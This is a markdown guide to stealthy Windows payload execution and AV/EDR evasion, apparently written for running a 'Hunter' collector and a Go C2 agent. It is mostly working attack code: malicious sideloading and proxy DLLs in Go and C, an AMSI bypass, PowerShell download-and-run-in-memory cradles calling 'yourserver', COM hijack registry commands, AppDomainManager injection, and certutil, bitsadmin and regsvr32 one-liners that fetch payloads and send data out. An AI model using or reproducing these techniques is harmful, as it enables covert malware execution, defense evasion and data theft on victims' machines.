# Stealth Execution Techniques

How to run payloads without dropping an obvious executable or triggering AV/EDR.
Covers DLL sideloading, reflective loading, COM hijacking, and more.

---

## Table of Contents

- [DLL Sideloading](#dll-sideloading)
- [DLL Proxying](#dll-proxying)
- [Reflective DLL Loading via PowerShell](#reflective-dll-loading-via-powershell)
- [AppDomainManager Injection (.NET)](#appdomainmanager-injection-net)
- [COM Object Hijacking](#com-object-hijacking)
- [Process Hollowing (concept)](#process-hollowing-concept)
- [LOLBins — Living Off the Land](#lolbins--living-off-the-land)
- [Running Hunter.cs Without Dropping an EXE](#running-huntercs-without-dropping-an-exe)
- [Running the Go Agent Without Dropping an EXE](#running-the-go-agent-without-an-exe)

---

## DLL Sideloading

### Concept

Windows searches for DLLs in this order when an application loads:
1. **Application directory** ← we exploit this
2. `C:\Windows\System32`
3. `C:\Windows\System`
4. `C:\Windows`
5. Current working directory
6. `%PATH%` directories

If we place a DLL with the right name in an **application's own directory**, Windows loads ours
instead of the real one — even if the real one exists in System32.

Many legitimate applications in writable user directories load DLLs by name without
full paths, making them vulnerable.

### Finding Vulnerable Applications

Use **Process Monitor** (Sysinternals) on a test machine:
1. Open procmon → Filter → `Operation = CreateFile` + `Result = NAME NOT FOUND` + `Path ends with .dll`
2. Launch applications
3. Look for DLL lookups that land in **writable user directories**

Common vulnerable paths:
```
%LOCALAPPDATA%\Microsoft\Teams\
%LOCALAPPDATA%\Microsoft\OneDrive\
%ProgramFiles(x86)\<various apps>\
%APPDATA%\<various apps>\
```

Or use **Dependencies** (GUI tool) or `dumpbin /dependents app.exe` to list all DLLs an app imports.

### Example — Microsoft Teams

Teams looks for `VERSION.dll` in its own directory before System32.
The Teams directory is user-writable.

```
C:\Users\<user>\AppData\Local\Microsoft\Teams\current\VERSION.dll   ← place malicious DLL here
```

When the user opens Teams, your DLL loads.

### Creating the Malicious DLL — Go

Go can compile a Windows DLL with `DllMain` support:

```go
// payload_dll.go
package main

import (
    "os/exec"
    "C"
)

//export DllMain
func DllMain() {
    // Your payload here — runs when DLL is loaded
    go func() {
        exec.Command("cmd", "/C", "start /b agent.exe").Run()
    }()
}

func main() {}
```

```bash
# Compile as Windows DLL
GOOS=windows GOARCH=amd64 CGO_ENABLED=1 \
    CC=x86_64-w64-mingw32-gcc \
    go build -buildmode=c-shared \
    -ldflags "-s -w" \
    -o VERSION.dll payload_dll.go

# Install mingw cross-compiler if needed:
sudo apt install gcc-mingw-w64-x86-64
```

### Creating the Malicious DLL — C (minimal)

A minimal C DLL that spawns a payload when loaded:

```c
// payload.c
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Run your agent in a new thread — don't block DllMain
        STARTUPINFO si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        CreateProcess(NULL, "C:\\Windows\\Temp\\svchost.exe",
                      NULL, NULL, FALSE, CREATE_NO_WINDOW,
                      NULL, NULL, &si, &pi);
    }
    return TRUE;
}
```

```bash
# Compile with mingw
x86_64-w64-mingw32-gcc -shared -o VERSION.dll payload.c -s
```

---

## DLL Proxying

Sideloading breaks the app if it actually needs the functions from the hijacked DLL.
**DLL proxying** forwards all function calls to the real DLL while running your payload.
The application works normally — harder to notice.

### Steps

1. Get the export list from the real DLL:
   ```powershell
   # PowerShell — list exports
   $dll = [System.Reflection.Assembly]::LoadFile("C:\Windows\System32\VERSION.dll")
   # Or with dumpbin:
   dumpbin /exports C:\Windows\System32\VERSION.dll
   ```

2. Create a proxy DLL that:
   - Exports every function the real DLL exports
   - Forwards each call to the real DLL
   - Runs your payload from `DllMain`

### Proxy DLL template (C)

```c
// proxy.c — VERSION.dll proxy
#include <windows.h>
#pragma comment(linker, "/export:GetFileVersionInfo=C:\\Windows\\System32\\VERSION.GetFileVersionInfo,@1")
#pragma comment(linker, "/export:GetFileVersionInfoEx=C:\\Windows\\System32\\VERSION.GetFileVersionInfoEx,@2")
#pragma comment(linker, "/export:GetFileVersionInfoSize=C:\\Windows\\System32\\VERSION.GetFileVersionInfoSize,@3")
#pragma comment(linker, "/export:GetFileVersionInfoSizeEx=C:\\Windows\\System32\\VERSION.GetFileVersionInfoSizeEx,@4")
#pragma comment(linker, "/export:VerFindFile=C:\\Windows\\System32\\VERSION.VerFindFile,@5")
#pragma comment(linker, "/export:VerInstallFile=C:\\Windows\\System32\\VERSION.VerInstallFile,@6")
#pragma comment(linker, "/export:VerLanguageName=C:\\Windows\\System32\\VERSION.VerLanguageName,@7")
#pragma comment(linker, "/export:VerQueryValue=C:\\Windows\\System32\\VERSION.VerQueryValue,@8")

BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {
    if (reason == DLL_PROCESS_ATTACH) {
        // Your payload in a separate thread
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WinExec,
                     "C:\\Windows\\Temp\\svchost.exe 0", 0, NULL);
    }
    return TRUE;
}
```

```bash
x86_64-w64-mingw32-gcc -shared -o VERSION.dll proxy.c -s
```

### Tools that automate proxy DLL creation

- **SharpDllProxy** — C# tool, generates proxy code automatically from a real DLL
  ```
  SharpDllProxy.exe --dll C:\Windows\System32\VERSION.dll --payload agent.exe
  ```
- **DLLirant** — automated search for vulnerable apps + proxy generation

---

## Reflective DLL Loading via PowerShell

Load your C# DLL **directly from memory** — it never touches disk as an EXE.

```powershell
# Download Hunter.dll from your server and load it into memory
$bytes = (New-Object Net.WebClient).DownloadData('http://yourserver/Hunter.dll')
[Reflection.Assembly]::Load($bytes) | Out-Null

# Call the entry point
[Hunter.Collector]::Run("http://yourserver:8000")
```

The DLL is only ever in RAM. AV can still detect it if it scans memory, but:
- No file on disk means no static scan
- Many AV products don't inspect .NET assemblies loaded this way
- Obfuscating the DLL with Confuser or ConfuserEx reduces AMSI detection

### Bypass AMSI first (on modern Windows)

AMSI (Antimalware Scan Interface) scans PowerShell commands before execution.
Patch it in memory before loading:

```powershell
# AMSI bypass (one of many — these get burnt over time)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Then load your DLL
$bytes = (New-Object Net.WebClient).DownloadData('http://yourserver/Hunter.dll')
[Reflection.Assembly]::Load($bytes) | Out-Null
[Hunter.Collector]::Run("http://yourserver:8000")
```

---

## AppDomainManager Injection (.NET)

Any .NET application can be hijacked to load an arbitrary assembly via the
`AppDomainManager` mechanism — without touching the target application's files.

### How it works

1. Create a .NET class library that inherits `AppDomainManager`
2. Override `InitializeNewDomain` — your code runs inside the target process
3. Set two environment variables that tell .NET to use your manager

```csharp
// Hijack.cs — compile as class library
using System;
using System.Runtime.InteropServices;

public class Hijack : AppDomainManager {
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
        // This runs inside the target .NET process
        // Run your payload here
        System.Threading.Tasks.Task.Run(() => {
            Hunter.Collector.Run("http://yourserver:8000");
        });
    }
}
```

```bash
# Compile
csc /target:library /out:Hijack.dll Hijack.cs
```

### Trigger it

```powershell
# Set env vars before launching ANY .NET application
$env:APPDOMAIN_MANAGER_ASM = "Hijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null"
$env:APPDOMAIN_MANAGER_TYPE = "Hijack"

# Launch a trusted .NET application — your code runs inside it
& "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe" /?
```

Your code runs inside MSBuild's process. MSBuild is a Microsoft-signed binary —
AV/EDR sees a legitimate process, not your payload.

---

## COM Object Hijacking

Windows Component Object Model (COM) objects are identified by GUIDs.
When a trusted application creates a COM object, Windows looks in the registry:
1. `HKCU\Software\Classes\CLSID\{GUID}` ← user-writable, checked first
2. `HKLM\Software\Classes\CLSID\{GUID}` ← system, requires admin

If we register a malicious DLL under a GUID in HKCU before the system one in HKLM,
our DLL loads when any trusted app uses that COM object.

### Finding vulnerable GUIDs

```powershell
# Find COM objects registered in HKLM that are NOT in HKCU
# (these can be hijacked without admin)
$hklm = Get-ChildItem "HKLM:\Software\Classes\CLSID" | Select -ExpandProperty Name
$hkcu = Get-ChildItem "HKCU:\Software\Classes\CLSID" -EA SilentlyContinue | Select -ExpandProperty Name
$candidates = $hklm | Where-Object { $_ -notin $hkcu }
```

Or use **COMHijackToolkit** which automates finding which CLSIDs loaded by common
apps (Task Scheduler, Explorer, etc.) can be hijacked per-user.

### Register the hijack

```powershell
# Register your DLL for a target CLSID
$clsid = "{YOUR-TARGET-GUID}"
New-Item -Path "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32" `
    -Name "(Default)" -Value "C:\Users\user\AppData\Local\Temp\payload.dll"
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32" `
    -Name "ThreadingModel" -Value "Apartment"
```

Next time a process uses this CLSID, your DLL loads.

---

## Process Hollowing (concept)

Create a legitimate suspended process, replace its memory with your payload, resume it.
The process appears to be `svchost.exe` or any other trusted binary.

1. `CreateProcess` with `CREATE_SUSPENDED`
2. `NtUnmapViewOfSection` to hollow out the memory
3. `VirtualAllocEx` + `WriteProcessMemory` to write your PE
4. `SetThreadContext` to set the entry point
5. `ResumeThread`

This is complex to implement but many open-source tools exist:
- **RunPE** — classic implementation
- **Process_Hollowing** — various GitHub implementations
- **Cobalt Strike's shinject** — commercial but widely understood

For CTF use, the reflective DLL / AppDomainManager approaches above are easier and
often sufficient.

---

## LOLBins — Living Off the Land

Execute payloads using binaries that already exist on the system (Microsoft-signed).
These bypass application whitelisting because the binary itself is trusted.

| Binary | How to abuse |
|--------|-------------|
| `msbuild.exe` | `<Exec Command="..." />` in an XML project file |
| `regsvr32.exe` | `regsvr32 /s /n /u /i:http://server/payload.sct scrobj.dll` (Squiblydoo) |
| `rundll32.exe` | `rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication "...` |
| `certutil.exe` | Download and decode: `certutil -urlcache -split -f http://server/file out` |
| `bitsadmin.exe` | `bitsadmin /transfer job http://server/agent.exe C:\Temp\agent.exe` |
| `wmic.exe` | `wmic process call create "cmd /c agent.exe"` |
| `csc.exe` | Compile C# on-target: `csc /out:payload.exe Hunter.cs` |
| `installutil.exe` | Load and run a .NET assembly via `[RunInstaller(true)]` |
| `powershell.exe` | Reflective load, AMSI bypass, encoded commands |
| `mshta.exe` | `mshta vbscript:Execute("...")` |

### MSBuild example — compile + run Hunter.cs without csc.exe

Create `build.xml` on target:
```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Run">
    <ClassLoad TaskName="Exec" AssemblyFile="Hunter.dll">
    </ClassLoad>
  </Target>
  <UsingTask TaskName="Exec" TaskFactory="CodeTaskFactory"
    AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
          using System;
          using Microsoft.Build.Framework;
          using Microsoft.Build.Utilities;
          public class Exec : Task {
              public override bool Execute() {
                  Hunter.Collector.Run("http://yourserver:8000");
                  return true;
              }
          }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

Run it:
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe build.xml
```

---

## Running Hunter.cs Without Dropping an EXE

### Method 1 — Reflective load (recommended)

```powershell
# On target — download and execute entirely in memory
$b = (New-Object Net.WebClient).DownloadData('http://yourserver/Hunter.dll')
[Reflection.Assembly]::Load($b) | Out-Null
[Hunter.Collector]::Run("http://yourserver:8000")
```

### Method 2 — Compile on-target with csc.exe (ships with Windows)

```powershell
# Download source
(New-Object Net.WebClient).DownloadFile('http://yourserver/Hunter.cs', 'C:\Temp\h.cs')

# Compile using .NET's own compiler — no external tools needed
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:C:\Temp\h.exe C:\Temp\h.cs

# Run
C:\Temp\h.exe --exfil http://yourserver:8000
```

### Method 3 — DLL sideload Hunter.dll

1. Compile `Hunter.cs` as a class library: `csc /target:library /out:Hunter.dll Hunter.cs`
2. Create a proxy DLL named after a DLL that Teams/OneDrive loads
3. Have the proxy call `Hunter.Collector.Run(...)` in DllMain equivalent
4. Drop into the application's directory

---

## Running the Go Agent Without an EXE

### Method 1 — Certutil download + run (no PowerShell needed)

```cmd
certutil -urlcache -split -f http://yourserver/svchost.exe C:\Temp\svchost.exe
C:\Temp\svchost.exe
```

### Method 2 — BITSAdmin download

```cmd
bitsadmin /transfer job /download /priority HIGH http://yourserver/svchost.exe C:\Temp\svchost.exe
```

### Method 3 — Compile Go on-target (if Go is installed)

```powershell
# On target, if Go is installed
$env:C2_SERVER="http://yourserver:8080"; $env:C2_TOKEN="token"
go run https://raw.githubusercontent.com/... main.go
```

### Method 4 — DLL from Go

Compile the Go agent as a Windows DLL:
```bash
# Requires CGO + mingw
GOOS=windows GOARCH=amd64 CGO_ENABLED=1 \
    CC=x86_64-w64-mingw32-gcc \
    go build -buildmode=c-shared \
    -ldflags "-s -w" \
    -o version.dll .
```

Then sideload `version.dll` using any of the methods above.
The `DllMain` entry point starts the beacon goroutine.
